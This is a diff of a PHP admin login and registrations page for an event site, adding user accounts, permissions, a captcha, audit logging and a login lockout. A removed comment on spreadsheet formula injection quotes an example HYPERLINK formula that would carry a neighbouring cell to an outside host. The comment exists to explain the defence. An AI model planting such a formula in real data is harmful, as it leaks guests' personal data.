@@ -1,19 +1,22 @@
 <?php
 /**
- * The admin: log in, read the registrations, change a status, export a CSV.
+ * The admin's front door and its first room: log in, read the registrations,
+ * change a status, hand over a badge, export a CSV.
  *
  * Server-rendered on purpose. It is a table behind a password on somebody
  * else's server; a build step and a bundle would be two more things that can
  * be out of date when a colleague opens it to check who has registered.
  *
- * Everything is one file so that deploying it is copying a directory.
+ * The other rooms are site.php (what the site says), import.php (adding
+ * projects), audit.php (what everyone did) and users.php (who may do it).
+ * What they share is in ../src/adminui.php.
  */
 
 declare(strict_types=1);
 
-require_once __DIR__ . '/../src/app.php';
+require_once __DIR__ . '/../src/adminui.php';
 require_once __DIR__ . '/../src/ticket.php';
-require_once __DIR__ . '/../src/guard.php';
+require_once __DIR__ . '/../src/captcha.php';
 
 $config = app_config();
 
@@ -22,10 +25,16 @@ $config = app_config();
  *
  * guard_headers() has to run before anything is printed, and the session has
  * to be started before anything reads it — including the login throttle,
- * which is the first thing a request to this page touches. See src/guard.php.
+ * which is the first thing a request to this page touches. The login page
+ * widens the content policy by exactly as much as Cloudflare's check needs,
+ * and not at all when that check is not configured.
  */
 guard_require_https($config);
-guard_headers('admin');
+guard_headers('admin', captcha_turnstile($config) ? [
+    'script' => ['https://challenges.cloudflare.com'],
+    'frame' => ['https://challenges.cloudflare.com'],
+    'connect' => ['https://challenges.cloudflare.com'],
+] : []);
 guard_admin_session($config);
 
 $ip = app_client_ip();
@@ -36,82 +45,87 @@ if (!guard_ip_allowed($config, $ip)) {
     exit;
 }
 
-$hash = guard_password_hash($config);
 $action = (string) ($_GET['action'] ?? $_POST['action'] ?? '');
+$error = '';
+$wait = 0;
 
 /* ------------------------------------------------------------------ auth */
 
-function admin_token(): string
-{
-    if (empty($_SESSION['csrf'])) {
-        $_SESSION['csrf'] = bin2hex(random_bytes(16));
-    }
-    return (string) $_SESSION['csrf'];
-}
-
-function admin_check_token(): bool
-{
-    return isset($_SESSION['csrf'])
-        && is_string($_POST['token'] ?? null)
-        && hash_equals((string) $_SESSION['csrf'], (string) $_POST['token']);
-}
-
-/**
- * The query string to come back to after a change, from the form that asked
- * for the change.
- *
- * It is a reader's own filter — `?q=ivanov&status=new` — carried through a
- * redirect so that confirming one registration does not throw away the
- * search that found it. It is also a value from the request going into a
- * `Location:` header, so it is taken as what it is: the characters a query
- * string is made of, and nothing else. PHP refuses a header with a newline
- * in it, but a field that arrives as an array rather than a string would
- * still have reached the header as the word "Array".
- */
-function admin_back(): string
-{
-    $back = $_POST['back'] ?? '';
-    if (!is_string($back)) {
-        return '';
-    }
-    return (string) preg_replace('/[^A-Za-z0-9_=&%.\-+]/', '', $back);
-}
-
-$error = '';
-
 if ($action === 'logout') {
+    if (!empty($_SESSION['admin'])) {
+        audit_log($config, 'logout');
+    }
     $_SESSION = [];
     session_destroy();
     header('Location: ?');
     exit;
 }
 
-$wait = 0;
-
 if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    /*
+     * The order matters and is the whole of the lock.
+     *
+     *   1. is the address already locked out?
+     *   2. is there a person here? — answered before the password is read,
+     *      and a wrong answer costs nothing but a new question, because the
+     *      lock below is a single strike and misreading five drawn letters
+     *      must not spend it;
+     *   3. is the password right? — one wrong answer locks the address.
+     */
+    $login = trim((string) ($_POST['login'] ?? ''));
     $given = (string) ($_POST['password'] ?? '');
     $wait = guard_login_wait($config, $ip);
+
     if ($wait > 0) {
         // Locked out, and not told whether the password was right: that is
         // the one thing a word list would still learn from a locked door.
         $error = 'locked';
-    } elseif ($hash === '') {
-        $error = 'no-hash';
-    } elseif (password_verify($given, $hash)) {
-        guard_login_ok($config, $ip);
-        guard_admin_login($config);
-        header('Location: ?');
-        exit;
+        audit_log($config, 'login.locked', ['login' => $login]);
     } else {
-        // Costs the same whether the password was close or nothing like it.
-        usleep(400000);
-        guard_login_failed($config, $ip);
-        $wait = guard_login_wait($config, $ip);
-        $error = $wait > 0 ? 'locked' : 'bad';
+        [$human, $why] = captcha_verify($config, $_POST, $ip);
+        if (!$human) {
+            $error = $why === 'unreachable' ? 'captcha-down' : 'captcha';
+            audit_log($config, 'login.captcha', ['login' => $login, 'sabab' => $why]);
+        } else {
+            /* An empty login is the installation that has always had one
+               password and one person: that account is called admin. */
+            $account = users_find($config, $login === '' ? 'admin' : $login);
+            $hash = $account === null ? '' : (string) $account['hash'];
+            if ($hash === '' && users_find($config, 'admin') === null) {
+                $error = 'no-hash';
+            } elseif ($account !== null && $account['active'] && $hash !== '' && password_verify($given, $hash)) {
+                guard_login_ok($config, $ip);
+                guard_admin_login($config, $account);
+                users_touch($config, (string) $account['id']);
+                audit_log($config, 'login', ['login' => (string) $account['login']]);
+                header('Location: ?');
+                exit;
+            } else {
+                /*
+                 * Costs the same whether the password was close, the account
+                 * is switched off or there is no such login at all. A door
+                 * that answers faster for a real name is a door that lists
+                 * its own staff.
+                 */
+                if ($hash === '') {
+                    password_verify($given, '$2y$12$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG');
+                }
+                usleep(400000);
+                guard_login_failed($config, $ip);
+                $wait = guard_login_wait($config, $ip);
+                $error = $wait > 0 ? 'locked' : 'bad';
+                audit_log($config, 'login.failed', ['login' => $login, 'bloklandi' => $wait > 0]);
+            }
+        }
     }
 }
 
-$authed = !empty($_SESSION['admin']);
+$user = users_current($config);
+$authed = $user !== null;
+if ($authed) {
+    users_touch($config, (string) $user['id']);
+}
+
 /* Why the last session ended, if it ended by itself. Read once. */
 $ended = (string) ($_SESSION['ended'] ?? '');
 unset($_SESSION['ended']);
@@ -119,13 +133,15 @@ unset($_SESSION['ended']);
 /* --------------------------------------------------------------- actions */
 
 /**
- * Changing the password, from the admin rather than from a file on the server.
+ * Changing one's own password.
  *
  * The current one is asked for as well, because the person at the keyboard is
  * not necessarily the person who logged in — an unlocked laptop should not be
- * a new password. The new hash goes to data/admin.json and the version it
- * carries goes up, which logs out every other browser that was logged in; see
- * guard_password_set() and guard_admin_session().
+ * a new password. Changing it ends every other session that account has open.
+ *
+ * Where the new hash goes depends on whether this installation has accounts
+ * yet: the one-password installation keeps writing data/admin.json, exactly
+ * as before, so nothing about it changes until somebody adds a second person.
  */
 $passwordSaved = false;
 if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'password') {
@@ -133,7 +149,7 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'password') 
     $complaint = guard_password_complaint($new);
     if (!admin_check_token()) {
         $error = 'csrf';
-    } elseif (!password_verify((string) ($_POST['current'] ?? ''), $hash)) {
+    } elseif (!password_verify((string) ($_POST['current'] ?? ''), (string) $user['hash'])) {
         usleep(400000);
         $error = 'pw-current';
     } elseif ($new !== (string) ($_POST['again'] ?? '')) {
@@ -142,10 +158,16 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'password') 
         $error = 'pw-' . $complaint;
     } else {
         try {
-            guard_password_set($config, $new);
-            // This browser stays logged in; the others do not.
-            $_SESSION['pwv'] = guard_password_version($config);
-            $hash = guard_password_hash($config);
+            if ($user['legacy']) {
+                guard_password_set($config, $new);
+                $_SESSION['pwv'] = guard_password_version($config);
+            } else {
+                users_set_password($config, (string) $user['id'], $new);
+                $fresh = users_by_id($config, (string) $user['id']);
+                $_SESSION['upwv'] = (int) ($fresh['pwv'] ?? 0);
+            }
+            $user = users_current($config);
+            audit_log($config, 'password.changed', ['login' => (string) $user['login']]);
             $passwordSaved = true;
         } catch (Throwable $e) {
             error_log('[forum-admin] password: ' . $e->getMessage());
@@ -155,8 +177,12 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'password') 
 }
 
 if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'status') {
-    if (admin_check_token()) {
-        storage_set_status($config, (int) ($_POST['id'] ?? 0), (string) ($_POST['status'] ?? ''));
+    if (admin_check_token() && user_can($user, 'registrations.edit')) {
+        $id = (int) ($_POST['id'] ?? 0);
+        $status = (string) ($_POST['status'] ?? '');
+        if (storage_set_status($config, $id, $status)) {
+            audit_log($config, 'registration.status', ['holat' => $status], '#' . $id);
+        }
     }
     header('Location: ?' . admin_back());
     exit;
@@ -169,9 +195,12 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'status') {
  * somebody here decides they do — see TICKET_AUTO in src/app.php.
  */
 if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'ticket') {
-    if (admin_check_token()) {
+    if (admin_check_token() && user_can($user, 'registrations.edit')) {
         try {
-            ticket_release($config, (int) ($_POST['id'] ?? 0), ($_POST['on'] ?? '') === '1');
+            $id = (int) ($_POST['id'] ?? 0);
+            $on = ($_POST['on'] ?? '') === '1';
+            ticket_release($config, $id, $on);
+            audit_log($config, 'registration.ticket', ['berildi' => $on], '#' . $id);
         } catch (Throwable $e) {
             error_log('[forum-admin] ticket: ' . $e->getMessage());
         }
@@ -180,34 +209,16 @@ if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'ticket') {
     exit;
 }
 
-/**
- * One cell, written so that a spreadsheet reads it as what the guest typed.
- *
- * Excel and LibreOffice read a cell beginning with `=`, `+`, `-` or `@` as a
- * formula, and the export is a file somebody opens on their own machine with
- * every other guest's telephone number in the next column. A registration is
- * a public form: `=HYPERLINK("https://…?x="&A2,"Click")` typed into the name
- * field is a live link in the organiser's spreadsheet that carries the row
- * beside it away, and `=WEBSERVICE(…)` does not wait to be clicked. Nothing
- * refuses it on the way in, because none of those characters is wrong in a
- * name — it is the spreadsheet, not the data, that has to be told.
- *
- * So a leading formula character is preceded by an apostrophe, which is the
- * mark both programs read as "this cell is text" and neither displays.
- *
- * It also repairs the telephone column, which this got wrong from the start:
- * every number here is written +998…, and Excel has been evaluating that as
- * a sum and showing 998901112233 ever since.
- */
-function admin_csv_cell(string $value): string
-{
-    return $value !== '' && str_contains("=+-@\t\r", $value[0]) ? "'" . $value : $value;
-}
-
 if ($authed && $action === 'csv') {
+    if (!user_can($user, 'registrations.export')) {
+        http_response_code(403);
+        header('Content-Type: text/plain; charset=utf-8');
+        echo "Arizalar roʻyxatini faqat adminkaning egasi yuklab oladi.\n";
+        exit;
+    }
     $rows = admin_filter(storage_all($config), $_GET);
-    header('Content-Type: text/csv; charset=utf-8');
-    header('Content-Disposition: attachment; filename="registrations-' . gmdate('Y-m-d') . '.csv"');
+    audit_log($config, 'registration.export', ['qatorlar' => count($rows)]);
+    admin_csv_start('registrations-' . gmdate('Y-m-d') . '.csv');
     $out = fopen('php://output', 'wb');
     // Excel reads a UTF-8 CSV as the local codepage unless the file opens
     // with a byte-order mark, and the names here are Cyrillic and Uzbek
@@ -305,6 +316,11 @@ $DIRECTION_LABEL = [
     'transport'      => 'Transport',
 ];
 $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 'Rad etilgan'];
+$mayEdit = user_can($user, 'registrations.edit');
+
+if (!$authed):
+    $kind = captcha_kind($config);
+    $challenge = $kind === 'turnstile' ? null : captcha_challenge($config);
 ?>
 <!doctype html>
 <html lang="uz">
@@ -312,61 +328,94 @@ $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="noindex, nofollow">
-<title>Roʻyxatdan oʻtganlar — <?= app_h($config['site_name'] ?? 'Forum') ?></title>
+<title>Adminka — <?= app_h($config['site_name'] ?? 'Forum') ?></title>
 <link rel="stylesheet" href="admin.css">
 <script src="admin.js" defer></script>
+<?php if ($kind === 'turnstile'): ?>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
+<?php endif; ?>
 </head>
-<body>
-
-<?php if (!$authed): ?>
+<body class="is-gate">
 <main class="gate">
   <form method="post" class="card">
     <h1>Adminka</h1>
     <p class="muted"><?= app_h($config['site_name'] ?? '') ?></p>
     <input type="hidden" name="action" value="login">
+    <label for="login">Login</label>
+    <input id="login" name="login" type="text" autocomplete="username" autocapitalize="none"
+           spellcheck="false" placeholder="admin" value="<?= app_h($_POST['login'] ?? '') ?>">
     <label for="pw">Parol</label>
     <input id="pw" name="password" type="password" autocomplete="current-password" required autofocus>
+
+    <?php if ($kind === 'turnstile'): ?>
+      <div class="cf-turnstile" data-sitekey="<?= app_h((string) $config['turnstile_site_key']) ?>" data-theme="light"></div>
+    <?php elseif ($kind === 'image'): ?>
+      <label for="cap">Rasmdagi belgilarni kiriting</label>
+      <div class="captcha">
+        <img src="captcha.php" alt="Tekshiruv rasmi" width="190" height="64" id="capimg">
+        <button type="button" class="btn btn--quiet" data-captcha-reload>Boshqa rasm</button>
+      </div>
+      <input id="cap" name="captcha" type="text" inputmode="latin" autocomplete="off"
+             autocapitalize="characters" spellcheck="false" required maxlength="8">
+    <?php else: ?>
+      <label for="cap">Tekshiruv: <?= app_h((string) $challenge['words']) ?> nechchi?</label>
+      <input id="cap" name="captcha" type="text" inputmode="numeric" autocomplete="off" required maxlength="4">
+    <?php endif; ?>
+
     <?php if ($error === 'bad'): ?>
-      <p class="err">Parol notoʻgʻri.</p>
+      <p class="err">Login yoki parol notoʻgʻri.</p>
+    <?php elseif ($error === 'captcha'): ?>
+      <p class="err">Tekshiruv javobi notoʻgʻri — qaytadan urinib koʻring. Parol tekshirilmadi.</p>
+    <?php elseif ($error === 'captcha-down'): ?>
+      <p class="err">
+        Tekshiruv xizmatiga (Cloudflare) ulanib boʻlmadi — serverda tashqi tarmoq yoʻqqa oʻxshaydi.
+        <code>server/.env</code> dagi <code>TURNSTILE_SITE_KEY</code> ni boʻshatsangiz,
+        adminka oʻzining ichki tekshiruviga qaytadi.
+      </p>
     <?php elseif ($error === 'locked'): ?>
       <p class="err">
-        Koʻp marta xato kiritildi. <?= (int) ceil($wait / 60) ?> daqiqadan keyin
-        qayta urinib koʻring.
+        Notoʻgʻri parol kiritildi — bu manzil <?= (int) ceil($wait / 60) ?> daqiqaga yopildi.
+        Shoshilinch boʻlsa, serverda <code>php server/bin/unlock.php</code> buyrugʻini bering.
       </p>
     <?php elseif ($error === 'no-hash'): ?>
       <p class="err">
         Parol hali oʻrnatilmagan. Serverda <code>server/.env</code> faylidagi
         <code>ADMIN_PASSWORD_HASH</code> ni toʻldiring:
-        <code>php server/bin/password.php "yangi parol"</code>
+        <code>php server/bin/password.php</code>
       </p>
     <?php elseif ($ended === 'timeout'): ?>
       <p class="muted">Sessiya vaqti tugadi — qaytadan kiring.</p>
     <?php elseif ($ended === 'password'): ?>
       <p class="muted">Parol oʻzgartirildi — yangi parol bilan kiring.</p>
+    <?php elseif ($ended === 'access'): ?>
+      <p class="muted">Huquqingiz yoki parolingiz oʻzgardi — qaytadan kiring.</p>
     <?php endif; ?>
     <button type="submit">Kirish</button>
+    <p class="muted small gate__note">
+      Bitta notoʻgʻri parol — manzil vaqtincha yopiladi. Loginni bilmasangiz
+      boʻsh qoldiring.
+    </p>
   </form>
 </main>
+</body>
+</html>
+<?php
+    exit;
+endif;
 
-<?php else: ?>
-<header class="bar">
-  <div class="bar__title">
-    <div>
-      <strong>Roʻyxatdan oʻtganlar</strong>
-      <span class="muted"><?= app_h($config['site_name'] ?? '') ?></span>
-    </div>
-    <span class="muted store"><?= app_h(storage_describe()) ?></span>
-  </div>
-  <div class="bar__right">
+admin_head($config, $user, 'Arizalar', 'regs');
+?>
+<div class="subbar">
+  <span class="muted store"><?= app_h(storage_describe()) ?></span>
+  <span class="subbar__spacer"></span>
+  <?php if (user_can($user, 'registrations.export')): ?>
     <a class="btn btn--lead" href="?action=csv&amp;<?= app_h($query) ?>">CSV yuklab olish</a>
-    <a class="btn" href="site.php">Saytni tahrirlash</a>
-    <a class="btn" href="?action=password">Parol</a>
-    <span class="bar__sep" aria-hidden="true"></span>
-    <a class="btn btn--plain" href="?action=logout">Chiqish</a>
-  </div>
-</header>
+  <?php endif; ?>
+  <a class="btn" href="?action=password">Parolim</a>
+</div>
 
 <main>
+  <?php admin_flash_print(); ?>
   <?php if ($fatal !== ''): ?>
     <p class="err big">Maʼlumotlarni oʻqib boʻlmadi: <?= app_h($fatal) ?></p>
   <?php endif; ?>
@@ -495,6 +544,7 @@ $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 
         </td>
         <td data-th="Yoʻnalish"><?= app_h($DIRECTION_LABEL[$row['direction'] ?? ''] ?? '') ?></td>
         <td data-th="Holat">
+          <?php if ($mayEdit): ?>
           <form method="post" class="status">
             <input type="hidden" name="action" value="status">
             <input type="hidden" name="token" value="<?= app_h(admin_token()) ?>">
@@ -507,6 +557,9 @@ $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 
             </select>
             <noscript><button type="submit">Saqlash</button></noscript>
           </form>
+          <?php else: ?>
+            <?= app_h($STATUS_LABEL[$row['status'] ?? 'new'] ?? '') ?>
+          <?php endif; ?>
         </td>
         <?php
         /**
@@ -522,7 +575,7 @@ $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 
           <?php if ($given): ?>
             <a class="btn btn--quiet" href="/ticket/<?= app_h(ticket_number((int) $row['id'], $config)) ?>" target="_blank" rel="noopener">E-bilet</a>
           <?php endif; ?>
-          <?php if (!$auto): ?>
+          <?php if (!$auto && $mayEdit): ?>
             <form method="post" class="ticket__give">
               <input type="hidden" name="action" value="ticket">
               <input type="hidden" name="token" value="<?= app_h(admin_token()) ?>">
@@ -542,7 +595,5 @@ $STATUS_LABEL = ['new' => 'Yangi', 'confirmed' => 'Tasdiqlangan', 'declined' => 
   </table>
   <?php endif; ?>
 </main>
-<?php endif; ?>
-
-</body>
-</html>
+<?php
+admin_foot();
